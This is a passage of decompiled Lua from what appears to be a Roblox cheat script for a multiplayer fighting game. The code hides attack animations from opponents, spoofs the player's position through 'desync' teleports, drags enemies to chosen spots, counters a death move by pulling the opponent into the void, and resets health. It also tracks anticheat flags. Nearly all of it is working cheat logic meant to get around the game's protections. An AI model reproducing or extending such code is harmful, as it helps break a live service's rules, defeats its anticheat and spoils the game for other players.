                                    v757:Play();
                                    v757.Looped = true;
                                elseif v757.IsPlaying and not Toggles.FuckedUpCharacter.Value or v760 % 1000 == 0 then
                                    v757:Stop();
                                end;
                                v757:AdjustSpeed(v764);
                            end;
                            if l_v748_0 then
                                if Toggles.FuckedUpCharacter.Value then
                                    l_v749_0.CFrame = v745.CFrame;
                                    if not l_v748_0.IsPlaying then
                                        l_v748_0:Play();
                                        l_v748_0.Looped = true;
                                    end;
                                else
                                    l_v749_0.CFrame = CFrame.new(100000000, 100000000, 100000000);
                                    if l_v748_0.IsPlaying then
                                        l_v748_0:Stop();
                                    end;
                                end;
                                l_v748_0:AdjustSpeed(v764);
                            end;
                        end);
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v12 (ref), v744 (ref), v746 (ref), l_TweenService_0 (ref)
                            while task.wait() and (not getChar(v12) or getChar(v12) == v744) do
                                if v744:GetAttribute("Blocking") and v744:GetAttribute("Blocking") == true then
                                    local v765 = "";
                                    local l_Value_9 = Options.BlockAnimation.Value;
                                    local l_l_Value_9_0 = l_Value_9;
                                    if l_Value_9 == "Normal" then
                                        v765 = "";
                                    elseif l_Value_9 == "One Hand" then
                                        v765 = "17097146599";
                                    elseif l_Value_9 == "Gojo" then
                                        v765 = "18459178353";
                                    elseif l_Value_9 == "Infinity" then
                                        v765 = "15020965094";
                                    elseif l_Value_9 == "Boxer" then
                                        v765 = "14616272668";
                                    end;
                                    if not v765.match(v765, "^%s*$") then
                                        local v768 = loadAnim(v746, v765);
                                        repeat
                                            if not v768 then
                                                v768 = loadAnim(v746, v765);
                                            end;
                                            if v768 and not v768.IsPlaying then
                                                v768.Play(v768);
                                                if v765 == "17097146599" then
                                                    v768.AdjustSpeed(v768, 2.5);
                                                    repeat
                                                        task.wait();
                                                    until v768.TimePosition >= 1;
                                                    v768.AdjustSpeed(v768, 0);
                                                elseif v765 == "18459178353" then
                                                    v768.AdjustSpeed(v768, 2.5);
                                                    repeat
                                                        task.wait();
                                                    until v768.TimePosition >= 0.5;
                                                    v768.AdjustSpeed(v768, 0);
                                                elseif v765 == "15020965094" then
                                                    v768.TimePosition = 1;
                                                    v768.AdjustSpeed(v768, 0);
                                                elseif v765 == "14616272668" then
                                                    v768.TimePosition = 0.25;
                                                    v768.AdjustSpeed(v768, 0);
                                                    local v769 = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true, 0);
                                                    l_TweenService_0:Create(v768, v769, {
                                                        TimePosition = 0.4
                                                    }):Play();
                                                end;
                                            end;
                                            task.wait();
                                        until v744:GetAttribute("Blocking") == false or l_l_Value_9_0 ~= Options.BlockAnimation.Value;
                                        if v768 then
                                            v768.Stop(v768, Options.BlockAnimationEndFadeTime.Value);
                                        end;
                                    end;
                                end;
                            end;
                        end);
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v12 (ref), v744 (ref), v746 (ref), l_TweenService_0 (ref), l_RenderStepped_0 (ref)
                            while task.wait() and (not getChar(v12) or getChar(v12) == v744) do
                                if v746.MoveDirection == Vector3.new() then
                                    local v770 = "";
                                    local v771 = nil;
                                    local v772 = nil;
                                    repeat
                                        if Idle ~= "Normal" and (not v771 or v771 and not v771.IsPlaying) or v770 ~= Options.IdleAnimation.Value then
                                            local l_Value_10 = Options.IdleAnimation.Value;
                                            v770 = Options.IdleAnimation.Value;
                                            if v771 then
                                                v771.Stop(v771);
                                            end;
                                            if v772 then
                                                v772.Stop(v772);
                                            end;
                                            if l_Value_10 == "Watch" then
                                                v771 = loadAnim(v746, "18897733312");
                                                v771.Priority = Enum.AnimationPriority.Idle;
                                                v771:Play();
                                            elseif l_Value_10 == "Casual" then
                                                v771 = loadAnim(v746, "13736115009");
                                                v771.Priority = Enum.AnimationPriority.Idle;
                                                v771:Play(0.2);
                                                v772 = loadAnim(v746, "18253570434");
                                                v772.Priority = Enum.AnimationPriority.Idle;
                                                v772:Play();
                                                v772:AdjustSpeed(0);
                                                v772.TimePosition = 0.3;
                                            elseif l_Value_10 == "Confident" then
                                                v771 = loadAnim(v746, "18450406917");
                                                v771.Priority = Enum.AnimationPriority.Idle;
                                                v771:Play(0.2);
                                                v771:AdjustSpeed(0);
                                                local v774 = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true, 0);
                                                l_TweenService_0:Create(v771, v774, {
                                                    TimePosition = 0.1
                                                }):Play();
                                            elseif l_Value_10 == "Fent Master" then
                                                v771 = loadAnim(v746, "17086333563");
                                                v771.Priority = Enum.AnimationPriority.Idle;
                                                v771:Play(0.2);
                                                v771:AdjustSpeed(0);
                                                v771.TimePosition = 1.5;
                                                local v775 = TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true, 0);
                                                l_TweenService_0:Create(v771, v775, {
                                                    TimePosition = 2
                                                }):Play();
                                            elseif l_Value_10 == "Fly Idle" then
                                                v771 = loadAnim(v746, "17124061663");
                                                v771.Priority = Enum.AnimationPriority.Idle;
                                                v771:Play();
                                            end;
                                        end;
                                        l_RenderStepped_0:Wait();
                                    until v746.MoveDirection ~= Vector3.new();
                                    if v771 then
                                        v771.Stop(v771, Options.IdleAnimationEndFadeTime.Value);
                                    end;
                                    if v772 then
                                        v772.Stop(v772);
                                    end;
                                elseif v746.MoveDirection ~= Vector3.new() then
                                    local v776 = nil;
                                    local l_Value_11 = Options.RunAnimation.Value;
                                    if l_Value_11 == "Normal" then
                                        v776 = "";
                                    elseif l_Value_11 == "Gojo Run" then
                                        v776 = "18897115785";
                                    elseif l_Value_11 == "Sonic EXE" then
                                        v776 = "17860467628";
                                    elseif l_Value_11 == "Girly Walk" then
                                        v776 = "17861862787";
                                    elseif l_Value_11 == "Steve Walk" then
                                        v776 = "17861872519";
                                    elseif l_Value_11 == "Sassy Walk" then
                                        v776 = "17861893094";
                                    elseif l_Value_11 == "Yandere Walk" then
                                        v776 = "17086054994";
                                    elseif l_Value_11 == "Sword Walk" then
                                        v776 = "17120635926";
                                    elseif l_Value_11 == "March" then
                                        v776 = "15962443652";
                                    elseif l_Value_11 == "Hunter" then
                                        v776 = "15962326593";
                                    elseif l_Value_11 == "Goofy" then
                                        v776 = "18897664299";
                                    elseif l_Value_11 == "Officer Earl" then
                                        v776 = "18897700236";
                                    elseif l_Value_11 == "Kazotsky Kick" then
                                        v776 = "17861870996";
                                    end;
                                    do
                                        local l_v776_0 = v776;
                                        if not l_v776_0.match(l_v776_0, "^%s*$") then
                                            repeat
                                                if not RunAnim then
                                                    RunAnim = loadAnim(v746, l_v776_0);
                                                end;
                                                if RunAnim and tostring(RunAnim.Animation.AnimationId):match("%d+") ~= l_v776_0 then
                                                    RunAnim:Destroy();
                                                    RunAnim = loadAnim(v746, l_v776_0);
                                                end;
                                                if RunAnim then
                                                    if not table.find({
                                                        "17860467628"
                                                    }, l_v776_0) then
                                                        RunAnim:AdjustSpeed(Options.RunAnimationSpeed.Value);
                                                    end;
                                                    if not RunAnim.IsPlaying then
                                                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                            -- upvalues: v744 (ref), l_v776_0 (ref), l_TweenService_0 (ref)
                                                            if not v744:FindFirstChild("Freeze") then
                                                                RunAnim:Play(Options.RunAnimationStartFadeTime.Value);
                                                                if l_v776_0 == "17860467628" then
                                                                    RunAnim:AdjustSpeed(0);
                                                                    RunAnim.TimePosition = 1.25;
                                                                    local v779 = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true, 0);
                                                                    l_TweenService_0:Create(RunAnim, v779, {
                                                                        TimePosition = 1.5
                                                                    }):Play();
                                                                end;
                                                            end;
                                                        end);
                                                    end;
                                                end;
                                                task.wait();
                                            until v746.MoveDirection == Vector3.new() or Options.RunAnimation.Value ~= l_Value_11;
                                            if RunAnim then
                                                RunAnim:Stop(Options.RunAnimationEndFadeTime.Value);
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end);
                        v67[#v67 + 1] = v746.HealthChanged:Connect(function(v780) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v745 (ref), v746 (ref), v758 (ref)
                            if v780 <= 0 and v745.CFrame.Y <= 0 then
                                v746.Health = v758;
                            end;
                        end);
                        v67[#v67 + 1] = v744.AttributeChanged:Connect(function(v781) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v744 (ref), v745 (ref), v94 (ref), v746 (ref), v75 (ref)
                            if v781 == "Combo" and v744:GetAttribute("Combo") == 5 and v745 then
                                if Toggles.WallComboAnywhere.Value then
                                    if Options.AutoWallCombo.Value ~= "Auto Wall Combo + Bring" then
                                        local v782 = nil;
                                        do
                                            local l_v782_0 = v782;
                                            if not v94.Invisibility and not Toggles.FuckedUpCharacter.Value then
                                                l_v782_0 = loadAnim(v746, "181525546", "Server");
                                                l_v782_0.Priority = Enum.AnimationPriority.Action3;
                                                task.delay(0.1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: l_v782_0 (ref)
                                                    l_v782_0:Play();
                                                    l_v782_0.TimePosition = 1;
                                                    l_v782_0:AdjustWeight(999999);
                                                    l_v782_0:AdjustSpeed(0);
                                                end);
                                            end;
                                            v94["Doing Wall Combo Anywhere"] = true;
                                            local v784 = tick();
                                            repeat
                                                getgenv().flingDesync = {
                                                    CFrame = v745.CFrame * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                                };
                                                task.wait();
                                            until tick() >= v784 + 0.6;
                                            getgenv().flingDesync = nil;
                                            v94["Doing Wall Combo Anywhere"] = false;
                                            task.delay(0.1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: l_v782_0 (ref)
                                                if l_v782_0 then
                                                    l_v782_0:Stop();
                                                end;
                                            end);
                                        end;
                                    elseif Options.AutoWallCombo.Value == "Auto Wall Combo + Bring" then
                                        v94["Doing Wall Combo Anywhere"] = true;
                                        local v785 = tick();
                                        repeat
                                            getgenv().flingDesync = {
                                                CFrame = v745.CFrame * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                            };
                                            task.wait();
                                        until tick() >= v785 + 0.225;
                                        local l_CFrame_3 = v745.CFrame;
                                        getgenv().flingDesync = {
                                            CFrame = v75[Options.AutoWallComboArea.Value]
                                        };
                                        task.wait(0.2);
                                        communicate({
                                            Goal = "Wall Combo"
                                        });
                                        getgenv().flingDesync = nil;
                                        v94["Doing Wall Combo Anywhere"] = false;
                                        task.wait(0.5);
                                        if v744:FindFirstChild("ForceField") and Toggles.AutoWallComboTPBack.Value then
                                            stopAllAnims(v746);
                                            heartbeatTp(l_CFrame_3);
                                        end;
                                    end;
                                end;
                            elseif v781 == "Blocking" and v744:GetAttribute("Blocking") and Toggles.InvisibleMoves_Block.Value then
                                v744:SetAttribute("Blocking", false);
                            elseif v781 == "TotalKillsFrb" and Toggles.AutoEmoteSpin.Value then
                                communicate({
                                    Goal = "Emote Spin"
                                });
                            end;
                        end);
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v12 (ref), v744 (ref), l_ReplicatedStorage_0 (ref), v745 (ref), l_RenderStepped_0 (ref)
                            while task.wait() and (not getChar(v12) or getChar(v12) == v744) do
                                if getgenv().desync and not v744:FindFirstChild("AbsoluteImmortal") then
                                    local v787 = {
                                        [1] = l_ReplicatedStorage_0.Resources.NinjaUlt.Afterimage_Despawn:Clone()
                                    };
                                    v787[1].Parent = v745;
                                    v787[2] = l_ReplicatedStorage_0.Resources.VanishingKick.tpthing:Clone();
                                    v787[2].Parent = v745;
                                    for _, v789 in pairs(v787[1]:GetChildren()) do
                                        if v789:IsA("ParticleEmitter") then
                                            v789.Enabled = true;
                                            v789.Rate = 100;
                                        end;
                                    end;
                                    v787[2].Enabled = true;
                                    v787[2].Rate = 100;
                                    repeat
                                        v787[1].CFrame = v745.CFrame;
                                        l_RenderStepped_0:Wait();
                                    until not getgenv().desync or v744:FindFirstChild("AbsoluteImmortal");
                                    for _, v791 in pairs(v787) do
                                        v791:Destroy();
                                    end;
                                end;
                            end;
                        end);
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v744 (ref), v745 (ref), v12 (ref), v94 (ref), l_RenderStepped_0 (ref)
                            for _, v793 in pairs(v744:GetDescendants()) do
                                do
                                    local l_v793_0 = v793;
                                    if l_v793_0:IsA("BasePart") and l_v793_0 ~= v745 and l_v793_0.Transparency ~= 1 and not l_v793_0.Name:lower():find("hitbox") then
                                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                            -- upvalues: v12 (ref), v744 (ref), l_v793_0 (ref), v94 (ref), l_RenderStepped_0 (ref)
                                            while task.wait() and (not getChar(v12) or getChar(v12) == v744) do
                                                if l_v793_0 and (v94.Invisibility or getgenv().desync and not v744:FindFirstChild("AbsoluteImmortal")) then
                                                    l_v793_0.Transparency = 0.5;
                                                    repeat
                                                        l_RenderStepped_0:Wait();
                                                    until not v94.Invisibility and (not getgenv().desync or v744:FindFirstChild("AbsoluteImmortal")) or getChar(v12) and getChar(v12) ~= v744;
                                                    l_v793_0.Transparency = 0;
                                                end;
                                            end;
                                        end);
                                    end;
                                end;
                            end;
                        end);
                        v67[#v67 + 1] = v746.AnimationPlayed:Connect(function(v795) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v91 (ref), v94 (ref), l_RenderStepped_0 (ref), v746 (ref), v602 (ref), v437 (ref), v71 (ref), v87 (ref), l_UserInputService_0 (ref), v744 (ref), v745 (ref), l_Players_0 (ref), v12 (ref), v72 (ref), v84 (ref), v85 (ref), v86 (ref), l_TweenService_0 (ref)
                            local l_AnimationId_0 = v795.Animation.AnimationId;
                            if v795.Priority == Enum.AnimationPriority.Action4 and v795.Animation.AnimationId ~= v91.ID and v94.Invisibility and (not getgenv().flingDesync or not getgenv().flingDesync.Velocity) then
                                v795:AdjustWeight(-999999);
                            end;
                            if l_AnimationId_0:match("95000469063288") and Toggles.TrashcanLaunchh and Toggles.TrashcanLaunchh.Value then
                                local v797 = os.clock();
                                repeat
                                    l_RenderStepped_0:Wait();
                                until os.clock() >= v797 + 3;
                                v746.Health = 0;
                            end;
                            if idMatch(l_AnimationId_0, {
                                "18748398210"
                            }) then
                                v602 = v602 + 1;
                                v437:Notify({
                                    Title = bypassText("Anticheat Flagged"), 
                                    Description = bypassText("A2 (Animation)"), 
                                    Time = 10, 
                                    SoundId = v71.Notification
                                });
                            end;
                            if idMatch(l_AnimationId_0, {
                                "13814919604", 
                                "13813450889", 
                                "13813448561", 
                                "13813955149"
                            }) and Toggles.NoTrashcanHold.Value then
                                v795:Stop();
                            elseif idMatch(l_AnimationId_0, {
                                "7815618175"
                            }) and Options.RunAnimation.Value ~= "Normal" then
                                v795:Stop();
                            elseif idMatch(l_AnimationId_0, {
                                "10470389827"
                            }) and Options.BlockAnimation.Value ~= "Normal" then
                                v795:Stop();
                            elseif idMatch(l_AnimationId_0, v87) then
                                if Toggles.CustomSideDash.Value then
                                    v795:AdjustSpeed(Options.SDSpeed.Value);
                                end;
                                if Toggles.M1Reset.Value then
                                    local v800 = l_UserInputService_0.InputBegan:Once(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: l_UserInputService_0 (ref), v744 (ref), v795 (ref), l_RenderStepped_0 (ref)
                                        while true do
                                            if l_UserInputService_0:IsKeyDown(Enum.KeyCode.Q) and not v744:FindFirstChild("RagdollCancel") then
                                                if not l_UserInputService_0:IsKeyDown(Enum.KeyCode.A) and not l_UserInputService_0:IsKeyDown(Enum.KeyCode.D) and not l_UserInputService_0:IsKeyDown(Enum.KeyCode.S) then
                                                    communicate({
                                                        Dash = Enum.KeyCode.W, 
                                                        Key = Enum.KeyCode.Q, 
                                                        Goal = "KeyPress"
                                                    });
                                                    break;
                                                elseif workspace:GetAttribute("NoDashCooldown") then
                                                    v795:Stop();
                                                    for _, v799 in pairs(v744:GetChildren()) do
                                                        if v799.Name == "UsedDash" or v799.Name == "Freeze" then
                                                            v799:Destroy();
                                                        end;
                                                    end;
                                                    break;
                                                else
                                                    break;
                                                end;
                                            else
                                                l_RenderStepped_0:Wait();
                                                if not v795.IsPlaying then
                                                    break;
                                                end;
                                            end;
                                        end;
                                    end);
                                    do
                                        local l_v800_0 = v800;
                                        task.delay(1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                            -- upvalues: l_v800_0 (ref)
                                            l_v800_0:Disconnect();
                                        end);
                                    end;
                                end;
                            elseif l_AnimationId_0:match("11343250001") and rawget(Options.AntiMoves_Saitama.Value, "Anti Death Counter") then
                                v795:Stop();
                                task.spawn(fixCam);
                                v744:WaitForChild("AbsoluteImmortal", 1);
                                if not v744:FindFirstChild("AbsoluteImmortal") then
                                    return;
                                else
                                    local l_CFrame_4 = v745.CFrame;
                                    local v803 = nil;
                                    for _, v805 in pairs(l_Players_0:GetPlayers()) do
                                        if v805 ~= v12 then
                                            local v806 = getChar(v805);
                                            local v807 = v806 and getRoot(v806);
                                            local v808 = v806 and getHumanoid(v806);
                                            if v806 and v807 and v808 then
                                                for _, v810 in pairs(v808:GetPlayingAnimationTracks()) do
                                                    if v810.Animation.AnimationId:match("11343318134") and (v745.Position - v807.Position).Magnitude <= 15 then
                                                        v803 = v805;
                                                    end;
                                                end;
                                            end;
                                        end;
                                    end;
                                    local v811 = nil;
                                    local v812 = nil;
                                    do
                                        local l_v812_0 = v812;
                                        if v803 then
                                            v811 = getChar(v803);
                                            l_v812_0 = v811 and getHumanoid(v811);
                                            v437:Notify({
                                                Title = bypassText("Phantasm"), 
                                                Description = bypassText(v803.DisplayName .. " death countered you!"), 
                                                Time = 5, 
                                                SoundId = v71.Notification
                                            });
                                        else
                                            l_v812_0 = ({
                                                Character = {
                                                    Humanoid = {
                                                        Health = 100
                                                    }
                                                }, 
                                                DisplayName = "{Failed to get username}"
                                            }).Character.Humanoid;
                                            task.delay(2, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: l_v812_0 (ref)
                                                l_v812_0.Health = 0;
                                            end);
                                            v437:Notify({
                                                Title = bypassText("Phantasm"), 
                                                Description = bypassText("Unable to find who death countered you."), 
                                                Time = 5, 
                                                SoundId = v71.Notification
                                            });
                                        end;
                                        local l_CurrentCamera_4 = workspace.CurrentCamera;
                                        local v815 = nil;
                                        if l_CurrentCamera_4 then
                                            v815 = l_CurrentCamera_4.CameraSubject;
                                            l_CurrentCamera_4.CameraSubject = nil;
                                        end;
                                        local v816 = tick();
                                        repeat
                                            heartbeatTp(v72.Void * CFrame.Angles(math.rad(90), 0, 0));
                                            l_RenderStepped_0:Wait();
                                        until l_v812_0 and l_v812_0.Health <= 0 or v746.Health <= 0 or tick() >= v816 + 10;
                                        if l_CurrentCamera_4 then
                                            l_CurrentCamera_4.CameraSubject = v815;
                                        end;
                                        heartbeatTp(l_CFrame_4);
                                        task.wait(1);
                                        if v744:FindFirstChild("Freeze") then
                                            v744.Freeze:Destroy();
                                        end;
                                        if v744:FindFirstChild("NoRotate") then
                                            v744.NoRotate:Destroy();
                                        end;
                                        task.spawn(fixCam);
                                    end;
                                end;
                            elseif l_AnimationId_0:match("11365563255") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Table Flip") then
                                v795:Stop();
                                task.delay(3, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                    -- upvalues: v746 (ref)
                                    v746.HipHeight = 10;
                                    task.wait(0.75);
                                    v746.HipHeight = 0;
                                end);
                            elseif l_AnimationId_0:match("12983333733") then
                                if rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Serious Punch") then
                                    v795:Stop();
                                end;
                            elseif l_AnimationId_0:match("13927612951") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Omni-Directional Punch") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("12447707844") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Ult") then
                                v795:Stop();
                                local v817 = tick();
                                repeat
                                    getgenv().desync = {
                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                    };
                                    task.wait();
                                until tick() >= v817 + 1;
                                getgenv().desync = nil;
                            elseif l_AnimationId_0:match("12342141464") and rawget(Options.InvisibleMoves_Garou.Value, "Invisible Ult") then
                                v795:Stop();
                            elseif table.find({
                                "rbxassetid://13499771836", 
                                "rbxassetid://13497875049"
                            }, l_AnimationId_0) and rawget(Options.InvisibleMoves_Sonic.Value, "Invisible Ult") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("12772543293") and rawget(Options.InvisibleMoves_Genos.Value, "Invisible Ult") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("13146710762") and rawget(Options.InvisibleMoves_Genos.Value, "Invisible Incinerate") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("15145462680") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atmos Cleave") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("15391323441") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Ult") then
                                v795:Stop();
                            elseif idMatch(l_AnimationId_0, {
                                "16139108718", 
                                "16139708727", 
                                "16139402582"
                            }) and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Crushing Pull") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16515850153") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Windstorm Fury") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16431491215") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Stone Grave") then
                                v795:Stop();
                            elseif idMatch(l_AnimationId_0, {
                                "16597322398", 
                                "16597912086"
                            }) and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Expulsive Push") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16734584478") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Ult") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("15520132233") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunset") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("15676072469") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Solar Cleave") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16062410809") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunrise") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16062712948") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunrise Finisher") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16082123712") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atomic Slash") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("16057411888") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atomic Slash Finisher") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("17799224866") and rawget(Options.InvisibleMoves_Suiryu.Value, "Invisible Bullet Barrage") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("17275150809") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Terrible Tornado") then
                                v795:Stop();
                            elseif l_AnimationId_0:match("17278415853") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Terrible Tornado Finisher") then
                                v795:Stop();
                            elseif table.find(v84, l_AnimationId_0) and Toggles.InvisibleMoves_Counter.Value then
                                v795:AdjustWeight(-999999);
                            elseif table.find(v85, l_AnimationId_0) and Toggles.InvisibleMoves_CounterHit.Value then
                                v795:Stop();
                            elseif table.find(v86, l_AnimationId_0) and Toggles.InvisibleMoves_Block.Value then
                                v795:AdjustWeight(-999999);
                                local l_EsperShield_0 = v745:FindFirstChild("EsperShield");
                                if l_EsperShield_0 then
                                    for _, v820 in pairs(l_EsperShield_0:GetChildren()) do
                                        do
                                            local l_v820_0 = v820;
                                            if l_v820_0:IsA("ParticleEmitter") and not l_v820_0.Name:find("Impact") then
                                                task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: l_v820_0 (ref), l_RenderStepped_0 (ref), v795 (ref)
                                                    local l_Rate_0 = l_v820_0.Rate;
                                                    local l_Color_0 = l_v820_0.Color;
                                                    l_v820_0.Rate = 45;
                                                    if Toggles.InvisibleMoves_BlockColor.Value then
                                                        l_v820_0.Color = ColorSequence.new({
                                                            ColorSequenceKeypoint.new(0, Options.InvisibleMoves_BlockColor1.Value), 
                                                            ColorSequenceKeypoint.new(0.5, Options.InvisibleMoves_BlockColor2.Value), 
                                                            ColorSequenceKeypoint.new(1, Options.InvisibleMoves_BlockColor3.Value)
                                                        });
                                                    end;
                                                    l_v820_0.Enabled = true;
                                                    repeat
                                                        l_RenderStepped_0:Wait();
                                                    until not v795.IsPlaying;
                                                    l_v820_0.Enabled = false;
                                                    l_v820_0.Rate = l_Rate_0;
                                                    if Toggles.InvisibleMoves_BlockColor.Value then
                                                        l_v820_0.Color = l_Color_0;
                                                    end;
                                                end);
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                            if Toggles.SkillBring.Value then
                                local v824 = v72[Options.SkillBringArea.Value];
                                local l_Value_12 = Toggles.SkillBringTPBack.Value;
                                do
                                    local l_v824_0, l_l_Value_12_0 = v824, l_Value_12;
                                    if l_AnimationId_0:match("12273188754") then
                                        task.wait(0.25);
                                        v94["Pause Orbit"] = true;
                                        local l_CFrame_5 = v745.CFrame;
                                        local _ = tick();
                                        l_TweenService_0:Create(v745, TweenInfo.new(0.75, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                            CFrame = l_v824_0
                                        }):Play();
                                        task.wait(0.75);
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_5);
                                        end;
                                    elseif l_AnimationId_0:match("12296113986") then
                                        v94["Pause Orbit"] = true;
                                        local l_CFrame_6 = v745.CFrame;
                                        l_TweenService_0:Create(v745, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                            CFrame = l_v824_0
                                        }):Play();
                                        task.wait(1.5);
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_6);
                                        end;
                                    elseif l_AnimationId_0:match("14048285180") or l_AnimationId_0:match("14046756619") then
                                        task.wait(0.35);
                                        v94["Pause Orbit"] = true;
                                        local l_CFrame_7 = v745.CFrame;
                                        l_TweenService_0:Create(v745, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                            CFrame = CFrame.new(-66, 29, 20383)
                                        }):Play();
                                        task.wait(2.25);
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_7);
                                        end;
                                    elseif l_AnimationId_0:match("14705929107") then
                                        task.wait(1.75);
                                        v94["Pause Orbit"] = true;
                                        local l_CFrame_8 = v745.CFrame;
                                        local v833 = tick();
                                        repeat
                                            heartbeatTp(l_v824_0);
                                            task.wait();
                                        until tick() >= v833 + 0.5;
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_8);
                                        end;
                                    elseif l_AnimationId_0:match("13376962659") then
                                        task.wait(1.5);
                                        v94["Pause Orbit"] = true;
                                        local l_CFrame_9 = v745.CFrame;
                                        local v835 = tick();
                                        repeat
                                            heartbeatTp(l_v824_0);
                                            task.wait();
                                        until tick() >= v835 + 0.5;
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_9);
                                        end;
                                    elseif l_AnimationId_0:match("15145462680") then
                                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                            -- upvalues: l_Players_0 (ref), v12 (ref), v745 (ref), v94 (ref), l_v824_0 (ref), l_l_Value_12_0 (ref)
                                            task.wait(1.8);
                                            for _, v837 in pairs(l_Players_0:GetPlayers()) do
                                                if v837 ~= v12 then
                                                    local v838 = getChar(v837);
                                                    local v839 = v838 and getRoot(v838);
                                                    local v840 = v838 and getHumanoid(v838);
                                                    if v838 and v839 and v840 and (v839.Position - v745.Position).Magnitude <= 15 and v840.Health <= 20 then
                                                        return;
                                                    end;
                                                end;
                                            end;
                                            v94["Pause Orbit"] = true;
                                            local l_CFrame_10 = v745.CFrame;
                                            local v842 = tick();
                                            repeat
                                                heartbeatTp(l_v824_0);
                                                task.wait();
                                            until tick() >= v842 + 0.5;
                                            v94["Pause Orbit"] = false;
                                            if l_l_Value_12_0 then
                                                heartbeatTp(l_CFrame_10);
                                            end;
                                        end);
                                    elseif l_AnimationId_0:match("15295895753") then
                                        task.wait(0.4);
                                        if v795.IsPlaying then
                                            v94["Pause Orbit"] = true;
                                            local l_CFrame_11 = v745.CFrame;
                                            local v844 = tick();
                                            repeat
                                                heartbeatTp(l_v824_0);
                                                task.wait();
                                            until tick() >= v844 + 0.8;
                                            v94["Pause Orbit"] = false;
                                            if l_l_Value_12_0 then
                                                heartbeatTp(l_CFrame_11);
                                            end;
                                        end;
                                    elseif l_AnimationId_0:match("16139108718") then
                                        local l_CFrame_12 = v745.CFrame;
                                        v94["Pause Orbit"] = true;
                                        local v846 = tick();
                                        repeat
                                            heartbeatTp(l_v824_0);
                                            task.wait();
                                        until tick() >= v846 + 1;
                                        v94["Pause Orbit"] = false;
                                        if l_l_Value_12_0 then
                                            heartbeatTp(l_CFrame_12);
                                        end;
                                    end;
                                end;
                            end;
                            if l_AnimationId_0:match("135104210400610") then
                                repeat
                                    task.wait();
                                until not v795.IsPlaying;
                                if v795.TimePosition >= 0.75 then
